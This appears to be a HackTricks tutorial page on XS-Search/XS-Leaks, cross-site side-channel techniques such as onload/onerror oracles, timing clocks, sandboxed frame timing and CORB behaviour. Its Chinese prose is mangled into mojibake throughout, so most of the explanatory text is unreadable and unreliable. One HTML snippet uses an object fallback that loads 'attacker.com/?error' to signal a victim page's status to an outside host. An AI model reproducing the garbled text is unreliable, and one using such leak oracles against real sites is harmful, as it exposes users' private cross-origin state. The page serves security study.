# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œåˆ©ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* ä¸Šå…³æ³¨æˆ‘ä»¬\*\*ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

XS-Search æ˜¯ä¸€ç§åˆ©ç”¨**ä¾§ä¿¡é“æ¼æ´**æ¥æå–è·¨æºä¿¡æ¯çš„æ–¹æ³•ã€‚

æ­¤æ”»å‡»æ¶‰åŠçš„å…³é”®ç»„ä»¶åŒ…æ‹¬ï¼š

* **æ˜“å—æ”»å‡»çš„ Web**: æ„å›¾æå–ä¿¡æ¯çš„ç›®æ ‡ç½‘ç«™ã€‚
* **æ”»å‡»è€…çš„ Web**: æ”»å‡»è€…åˆ›å»ºçš„æ¶æ„ç½‘ç«™ï¼Œå—å®³è€…è®¿é—®è¯¥ç½‘ç«™ï¼Œæ‰˜ç®¡åˆ©ç”¨ç¨‹åºã€‚
* **åŒ…å«æ–¹æ³•**: ç”¨äºå°†æ˜“å—æ”»å‡»çš„ Web åŒ…å«åˆ°æ”»å‡»è€…çš„ Web ä¸­çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚ï¼Œwindow.openã€iframeã€fetchã€å¸¦æœ‰ href çš„ HTML æ ‡ç­¾ç­‰ï¼‰ã€‚
* **æ³„æ¼æŠ€æœ¯**: ç”¨äºé€šè¿‡åŒ…å«æ–¹æ³•æ”¶é›†çš„ä¿¡æ¯æ¥åŒºåˆ†æ˜“å—æ”»å‡»çš„ Web çŠ¶æ€å·®å¼‚çš„æŠ€æœ¯ã€‚
* **çŠ¶æ€**: æ”»å‡»è€…æ—¨åœ¨åŒºåˆ†æ˜“å—æ”»å‡»çš„ Web ä¸¤ç§æ½œåœ¨çŠ¶æ€ã€‚
* **å¯æ£€æµ‹çš„å·®å¼‚**: æ”»å‡»è€…ä¾èµ–äºæ¨æ–­æ˜“å—æ”»å‡»çš„ Web çŠ¶æ€çš„å¯è§‚å¯Ÿå˜åŒ–ã€‚

### å¯æ£€æµ‹çš„å·®å¼‚

å¯ä»¥åˆ†æå‡ ä¸ªæ–¹é¢æ¥åŒºåˆ†æ˜“å—æ”»å‡»çš„ Web çš„çŠ¶æ€ï¼š

* **çŠ¶æ€ç **: åŒºåˆ†è·¨æºçš„**å„ç§ HTTP å“åº”çŠ¶æ€ç **ï¼Œå¦‚æœåŠ¡å™¨é”™è¯¯ã€å®¢æˆ·ç«¯é”™è¯¯æˆ–èº«ä»½éªŒè¯é”™è¯¯ã€‚
* **API ä½¿ç”¨**: è¯†åˆ«é¡µé¢é—´**Web API çš„ä½¿ç”¨**ï¼Œæ­ç¤ºè·¨æºé¡µé¢æ˜¯å¦ä½¿ç”¨ç‰¹å®šçš„ JavaScript Web APIã€‚
* **é‡å®šå‘**: æ£€æµ‹åˆ°å¯¼èˆªåˆ°ä¸åŒé¡µé¢ï¼Œä¸ä»…æ˜¯ HTTP é‡å®šå‘ï¼Œè¿˜åŒ…æ‹¬ç”± JavaScript æˆ– HTML è§¦å‘çš„å¯¼èˆªã€‚
* **é¡µé¢å†…å®¹**: è§‚å¯Ÿ**HTTP å“åº”ä¸»ä½“**æˆ–é¡µé¢å­èµ„æºçš„å˜åŒ–ï¼Œä¾‹å¦‚**åµŒå…¥å¸§çš„æ•°é‡**æˆ–å›¾åƒå¤§å°çš„å·®å¼‚ã€‚
* **HTTP æ ‡å¤´**: æ³¨æ„**ç‰¹å®š HTTP å“åº”æ ‡å¤´**çš„å­˜åœ¨æˆ–å¯èƒ½çš„å€¼ï¼ŒåŒ…æ‹¬è¯¸å¦‚ X-Frame-Optionsã€Content-Disposition å’Œ Cross-Origin-Resource-Policy ç­‰æ ‡å¤´ã€‚
* **æ—¶é—´**: æ³¨æ„ä¸¤ç§çŠ¶æ€ä¹‹é—´çš„ä¸€è‡´æ—¶é—´å·®å¼‚ã€‚

### åŒ…å«æ–¹æ³•

* **HTML å…ƒç´ **: HTML æä¾›å„ç§å…ƒç´ ç”¨äº**åŒ…å«è·¨æºèµ„æº**ï¼Œå¦‚æ ·å¼è¡¨ã€å›¾åƒæˆ–è„šæœ¬ï¼Œè¿«ä½¿æµè§ˆå™¨è¯·æ±‚é HTML èµ„æºã€‚å¯ä»¥åœ¨ [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) æ‰¾åˆ°æ­¤ç›®çš„çš„æ½œåœ¨ HTML å…ƒç´ çš„æ±‡ç¼–ã€‚
* **æ¡†æ¶**: è¯¸å¦‚ **iframe**ã€**object** å’Œ **embed** ç­‰å…ƒç´ å¯ä»¥ç›´æ¥å°† HTML èµ„æºåµŒå…¥åˆ°æ”»å‡»è€…çš„é¡µé¢ä¸­ã€‚å¦‚æœé¡µé¢**ç¼ºä¹æ¡†æ¶ä¿æŠ¤**ï¼ŒJavaScript å¯ä»¥é€šè¿‡ contentWindow å±æ€§è®¿é—®è¢«æ¡†æ¶åŒ–èµ„æºçš„ window å¯¹è±¡ã€‚
* **å¼¹å‡ºçª—å£**: **`window.open`** æ–¹æ³•åœ¨æ–°æ ‡ç­¾é¡µæˆ–çª—å£ä¸­æ‰“å¼€èµ„æºï¼Œä¸º JavaScript æä¾›ä¸€ä¸ªéµå¾ª SOP åå¯ä»¥ä¸æ–¹æ³•å’Œå±æ€§äº¤äº’çš„çª—å£å¥æŸ„ã€‚å¼¹å‡ºçª—å£é€šå¸¸ç”¨äºå•ç‚¹ç™»å½•ï¼Œç»•è¿‡ç›®æ ‡èµ„æºçš„æ¡†æ¶å’Œ cookie é™åˆ¶ã€‚ä½†æ˜¯ï¼Œç°ä»£æµè§ˆå™¨é™åˆ¶å¼¹å‡ºçª—å£çš„åˆ›å»ºåˆ°æŸäº›ç”¨æˆ·æ“ä½œã€‚
* **JavaScript è¯·æ±‚**: JavaScript å…è®¸ä½¿ç”¨ **XMLHttpRequests** æˆ– **Fetch API** ç›´æ¥è¯·æ±‚ç›®æ ‡èµ„æºã€‚è¿™äº›æ–¹æ³•æä¾›å¯¹è¯·æ±‚çš„ç²¾ç¡®æ§åˆ¶ï¼Œä¾‹å¦‚é€‰æ‹©æ˜¯å¦è·Ÿéš HTTP é‡å®šå‘ã€‚

### æ³„æ¼æŠ€æœ¯

* **äº‹ä»¶å¤„ç†ç¨‹åº**: åœ¨ XS-Leaks ä¸­çš„ä¸€ä¸ªç»å…¸æ³„æ¼æŠ€æœ¯ï¼Œäº‹ä»¶å¤„ç†ç¨‹åºå¦‚ **onload** å’Œ **onerror** æä¾›æœ‰å…³èµ„æºåŠ è½½æˆåŠŸæˆ–å¤±è´¥çš„è§è§£ã€‚
* **é”™è¯¯æ¶ˆæ¯**: JavaScript å¼‚å¸¸æˆ–ç‰¹æ®Šé”™è¯¯é¡µé¢å¯ä»¥ç›´æ¥æä¾›æ³„æ¼ä¿¡æ¯ï¼Œè¦ä¹ˆé€šè¿‡é”™è¯¯æ¶ˆæ¯æœ¬èº«ï¼Œè¦ä¹ˆé€šè¿‡åŒºåˆ†å…¶å­˜åœ¨ä¸ä¸å­˜åœ¨ã€‚
* **å…¨å±€é™åˆ¶**: æµè§ˆå™¨çš„ç‰©ç†é™åˆ¶ï¼Œå¦‚å†…å­˜å®¹é‡æˆ–å…¶ä»–å¼ºåˆ¶æµè§ˆå™¨é™åˆ¶ï¼Œå¯ä»¥åœ¨è¾¾åˆ°é˜ˆå€¼æ—¶å‘å‡ºä¿¡å·ï¼Œä½œä¸ºæ³„æ¼æŠ€æœ¯ã€‚
* **å…¨å±€çŠ¶æ€**: å¯ä»¥åˆ©ç”¨ä¸æµè§ˆå™¨çš„**å…¨å±€çŠ¶æ€**ï¼ˆä¾‹å¦‚ï¼ŒHistory æ¥å£ï¼‰çš„å¯æ£€æµ‹äº¤äº’ã€‚ä¾‹å¦‚ï¼Œæµè§ˆå™¨å†å²è®°å½•ä¸­çš„**æ¡ç›®æ•°é‡**å¯ä»¥æä¾›æœ‰å…³è·¨æºé¡µé¢çš„çº¿ç´¢ã€‚
* **æ€§èƒ½ API**: æ­¤ API æä¾›å½“å‰é¡µé¢çš„**æ€§èƒ½è¯¦ç»†ä¿¡æ¯**ï¼ŒåŒ…æ‹¬æ–‡æ¡£å’ŒåŠ è½½èµ„æºçš„ç½‘ç»œæ—¶é—´ï¼Œä»è€Œæ¨æ–­è¯·æ±‚çš„èµ„æºã€‚
* **å¯è¯»å±æ€§**: ä¸€äº› HTML å±æ€§æ˜¯**å¯è·¨æºè¯»å–**çš„ï¼Œå¯ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œ`window.frame.length` å±æ€§å…è®¸ JavaScript è®¡ç®—è·¨æºç½‘é¡µä¸­åŒ…å«çš„å¸§æ•°ã€‚

## XSinator å·¥å…·å’Œè®ºæ–‡

XSinator æ˜¯ä¸€ä¸ªè‡ªåŠ¨å·¥å…·ï¼Œç”¨äº**æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å—åˆ°å‡ ç§å·²çŸ¥ XS-Leaks** çš„å½±å“ï¼Œå…¶è®ºæ–‡è§£é‡Šåœ¨ï¼š[**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

æ‚¨å¯ä»¥åœ¨ [**https://xsinator.com/**](https://xsinator.com/) **è®¿é—®è¯¥å·¥å…·**ã€‚

{% hint style="warning" %}
**æ’é™¤çš„ XS-Leaks**: æˆ‘ä»¬ä¸å¾—ä¸æ’é™¤ä¾èµ–**æœåŠ¡å·¥ä½œè€…**çš„ XS-Leaksï¼Œå› ä¸ºå®ƒä»¬ä¼šå¹²æ‰° XSinator ä¸­çš„å…¶ä»–æ³„æ¼ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬é€‰æ‹©**æ’é™¤ä¾èµ–ç‰¹å®š Web åº”ç”¨ç¨‹åºä¸­çš„é…ç½®é”™è¯¯å’Œæ¼æ´**çš„ XS-Leaksã€‚ä¾‹å¦‚ï¼Œè·¨æºèµ„æºå…±äº«ï¼ˆCORSï¼‰é…ç½®é”™è¯¯ã€postMessage æ³„æ¼æˆ–è·¨ç«™è„šæœ¬ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æ’é™¤äº†åŸºäºæ—¶é—´çš„ XS-Leaksï¼Œå› ä¸ºå®ƒä»¬ç»å¸¸å—åˆ°é€Ÿåº¦æ…¢ã€å˜ˆæ‚å’Œä¸å‡†ç¡®çš„å½±å“ã€‚
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œåˆ©ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **åŸºäºæ—¶é—´çš„æŠ€æœ¯**

ä¸€äº›ä»¥ä¸‹æŠ€æœ¯å°†ä½¿ç”¨æ—¶é—´ä½œä¸ºæ£€æµ‹ç½‘é¡µå¯èƒ½çŠ¶æ€å·®å¼‚çš„è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚åœ¨Webæµè§ˆå™¨ä¸­æœ‰ä¸åŒçš„æµ‹é‡æ—¶é—´çš„æ–¹æ³•ã€‚

**æ—¶é’Ÿ**ï¼š[performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) APIå…è®¸å¼€å‘äººå‘˜è·å–é«˜åˆ†è¾¨ç‡çš„æ—¶é—´æµ‹é‡ã€‚\
æ”»å‡»è€…å¯ä»¥æ»¥ç”¨å¤§é‡APIæ¥åˆ›å»ºéšå¼æ—¶é’Ÿï¼š[Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSSåŠ¨ç”»ç­‰ã€‚\
æ›´å¤šä¿¡æ¯ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## äº‹ä»¶å¤„ç†ç¨‹åºæŠ€æœ¯

### Onload/Onerror

* **åŒ…å«æ–¹æ³•**ï¼šFrames, HTML Elements
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **æ‘˜è¦**ï¼šå¦‚æœå°è¯•åœ¨onerror/onloadäº‹ä»¶ä¸­åŠ è½½èµ„æºï¼Œå½“èµ„æºæˆåŠŸ/å¤±è´¥åŠ è½½æ—¶ï¼Œå¯ä»¥æ¨æ–­å‡ºçŠ¶æ€ç ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

ä»£ç ç¤ºä¾‹å°è¯•ä»JSä¸­åŠ è½½è„šæœ¬å¯¹è±¡ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ ‡ç­¾ï¼Œå¦‚å¯¹è±¡ã€æ ·å¼è¡¨ã€å›¾åƒã€éŸ³é¢‘ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ç›´æ¥æ³¨å…¥æ ‡ç­¾ï¼Œå¹¶åœ¨æ ‡ç­¾å†…å£°æ˜`onload`å’Œ`onerror`äº‹ä»¶ï¼ˆè€Œä¸æ˜¯ä»JSä¸­æ³¨å…¥ï¼‰ã€‚

è¿™ç§æ”»å‡»è¿˜æœ‰ä¸€ä¸ªæ— éœ€è„šæœ¬çš„ç‰ˆæœ¬ï¼š

```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæœªæ‰¾åˆ° `example.com/404`ï¼Œå°†åŠ è½½ `attacker.com/?error`ã€‚

### Onload Timing

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API**å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ç„¶è€Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿï¼Œå¦‚[**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)ï¼Œå¯è¯†åˆ«è¿è¡Œè¶…è¿‡50æ¯«ç§’çš„ä»»åŠ¡ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) å¦ä¸€ä¸ªç¤ºä¾‹åœ¨:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

è¿™ç§æŠ€æœ¯ä¸å‰ä¸€ç§ç±»ä¼¼ï¼Œä½†**æ”»å‡»è€…**è¿˜å°†åœ¨**ç­”æ¡ˆä¸ºæ­£æˆ–è´Ÿæ—¶**å¼ºåˆ¶æ‰§è¡ŒæŸäº›æ“ä½œä»¥èŠ±è´¹**ç›¸å…³çš„æ—¶é—´**ï¼Œå¹¶æµ‹é‡è¯¥æ—¶é—´ã€‚

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** å¯ä½¿ç”¨[SharedArrayBuffer æ—¶é’Ÿ](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers)æ¥æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

é€šè¿‡åˆ©ç”¨[`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event)å’Œ[`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event)äº‹ä»¶ï¼Œå¯ä»¥æµ‹é‡è·å–èµ„æºæ‰€éœ€çš„æ—¶é—´ã€‚\*\*`beforeunload`**äº‹ä»¶åœ¨æµè§ˆå™¨å³å°†å¯¼èˆªåˆ°æ–°é¡µé¢æ—¶è§¦å‘ï¼Œè€Œ**`unload`\*\*äº‹ä»¶å‘ç”Ÿåœ¨å®é™…å¯¼èˆªæ—¶ã€‚å¯ä»¥è®¡ç®—è¿™ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´çš„æ—¶é—´å·®æ¥ç¡®å®šæµè§ˆå™¨è·å–èµ„æºæ‰€èŠ±è´¹çš„æ—¶é—´ã€‚

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) APIå¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

è§‚å¯Ÿåˆ°ï¼Œåœ¨ç¼ºä¹[æ¡†æ¶ä¿æŠ¤](https://xsleaks.dev/docs/defenses/opt-in/xfo/)çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥æµ‹é‡é¡µé¢åŠå…¶å­èµ„æºé€šè¿‡ç½‘ç»œåŠ è½½æ‰€éœ€çš„æ—¶é—´ã€‚è¿™é€šå¸¸æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºä»…å½“iframeçš„`onload`å¤„ç†ç¨‹åºåœ¨èµ„æºåŠ è½½å’ŒJavaScriptæ‰§è¡Œå®Œæˆåæ‰ä¼šè§¦å‘ã€‚ä¸ºäº†ç»•è¿‡è„šæœ¬æ‰§è¡Œå¼•å…¥çš„å˜åŒ–ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨`<iframe>`å†…ä½¿ç”¨[`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)å±æ€§ã€‚åŒ…å«æ­¤å±æ€§ä¼šé™åˆ¶è®¸å¤šåŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯JavaScriptçš„æ‰§è¡Œï¼Œä»è€Œä¿ƒè¿›ä¸»è¦å—ç½‘ç»œæ€§èƒ½å½±å“çš„æµ‹é‡ã€‚

```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```

### #ID + error + onload

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**:
* **æ‘˜è¦**: å¦‚æœæ‚¨å¯ä»¥ä½¿é¡µé¢åœ¨è®¿é—®æ­£ç¡®å†…å®¹æ—¶å‡ºç°é”™è¯¯ï¼Œå¹¶åœ¨è®¿é—®ä»»ä½•å†…å®¹æ—¶æ­£ç¡®åŠ è½½ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªå¾ªç¯æ¥æå–æ‰€æœ‰ä¿¡æ¯ï¼Œè€Œæ— éœ€æµ‹é‡æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**:

å‡è®¾æ‚¨å¯ä»¥**æ’å…¥**åŒ…å«**ç§˜å¯†å†…å®¹**çš„**é¡µé¢**åˆ°ä¸€ä¸ª**iframe**ä¸­ã€‚

æ‚¨å¯ä»¥è®©å—å®³è€…æœç´¢åŒ…å«â€œ_**flag**_â€çš„æ–‡ä»¶ï¼Œä½¿ç”¨ä¸€ä¸ª**iframe**ï¼ˆä¾‹å¦‚åˆ©ç”¨CSRFï¼‰ã€‚åœ¨iframeå†…ï¼Œæ‚¨çŸ¥é“\*\*`onload`äº‹ä»¶**å°†å§‹ç»ˆè‡³å°‘æ‰§è¡Œä¸€æ¬¡ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä»…æ›´æ”¹URLä¸­çš„**å“ˆå¸Œ**å†…å®¹æ¥**æ›´æ”¹iframe**çš„**URL\*\*ã€‚

ä¾‹å¦‚ï¼š

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

å¦‚æœç¬¬ä¸€ä¸ªURL**æˆåŠŸåŠ è½½**ï¼Œé‚£ä¹ˆå½“**æ›´æ”¹**URLçš„**å“ˆå¸Œ**éƒ¨åˆ†æ—¶ï¼Œ**`onload`äº‹ä»¶å°†ä¸ä¼šå†æ¬¡è§¦å‘**ã€‚ä½†æ˜¯ï¼Œ**å¦‚æœ**é¡µé¢åœ¨**åŠ è½½**æ—¶å‡ºç°æŸç§**é”™è¯¯**ï¼Œé‚£ä¹ˆ\*\*`onload`**äº‹ä»¶å°†**å†æ¬¡è§¦å‘\*\*ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥**åŒºåˆ†**ä¸€ä¸ª**æ­£ç¡®åŠ è½½**çš„é¡µé¢æˆ–è®¿é—®æ—¶å‡ºç°**é”™è¯¯**çš„é¡µé¢ã€‚

### Javascriptæ‰§è¡Œ

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**:
* **æ‘˜è¦**: å¦‚æœ**é¡µé¢**è¿”å›**æ•æ„Ÿå†…å®¹**ï¼Œæˆ–è€…ç”¨æˆ·å¯ä»¥**æ§åˆ¶**çš„**å†…å®¹**ã€‚ç”¨æˆ·å¯ä»¥åœ¨**è´Ÿé¢æƒ…å†µä¸‹**è®¾ç½®**æœ‰æ•ˆçš„JSä»£ç **ï¼Œå¹¶åœ¨\*\*`<script>`**æ ‡ç­¾å†…**åŠ è½½**æ¯æ¬¡å°è¯•ï¼Œå› æ­¤åœ¨**è´Ÿé¢**æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…çš„**ä»£ç **å°†è¢«**æ‰§è¡Œ\*\*ï¼Œè€Œåœ¨**è‚¯å®š**æƒ…å†µä¸‹**ä¸ä¼š**æ‰§è¡Œä»»ä½•æ“ä½œã€‚
* **ä»£ç ç¤ºä¾‹**:

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **åŒ…å«æ–¹æ³•**: HTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**: çŠ¶æ€ç å’Œæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **æ‘˜è¦**: **è·¨æºè¯»å–é˜»æ­¢ï¼ˆCORBï¼‰æ˜¯ä¸€é¡¹å®‰å…¨æªæ–½ï¼Œé˜²æ­¢ç½‘é¡µåŠ è½½æŸäº›æ•æ„Ÿçš„è·¨æºèµ„æºï¼Œä»¥é˜²æ­¢Spectre**ç­‰æ”»å‡»ã€‚ç„¶è€Œï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶ä¿æŠ¤è¡Œä¸ºã€‚å½“å—**CORB**ä¿æŠ¤çš„å“åº”è¿”å›ä¸€ä¸ªå¸¦æœ‰`nosniff`å’Œ`2xx`çŠ¶æ€ç çš„\_CORBå—ä¿æŠ¤\_`Content-Type`æ—¶ï¼Œ**CORB**ä¼šå‰¥ç¦»å“åº”çš„ä¸»ä½“å’Œæ ‡å¤´ã€‚è§‚å¯Ÿåˆ°è¿™ä¸€ç‚¹çš„æ”»å‡»è€…å¯ä»¥æ¨æ–­**çŠ¶æ€ç **ï¼ˆæŒ‡ç¤ºæˆåŠŸæˆ–é”™è¯¯ï¼‰å’Œ`Content-Type`ï¼ˆè¡¨ç¤ºæ˜¯å¦å—**CORB**ä¿æŠ¤ï¼‰çš„ç»„åˆï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„ä¿¡æ¯æ³„æ¼ã€‚
* **ä»£ç ç¤ºä¾‹**:

æŸ¥çœ‹æ›´å¤šä¿¡æ¯é“¾æ¥ä»¥è·å–æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### onblur

* **åŒ…å«æ–¹æ³•**: æ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **æ‘˜è¦**: ä»idæˆ–nameå±æ€§ä¸­æ³„æ¼æ•æ„Ÿæ•°æ®ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

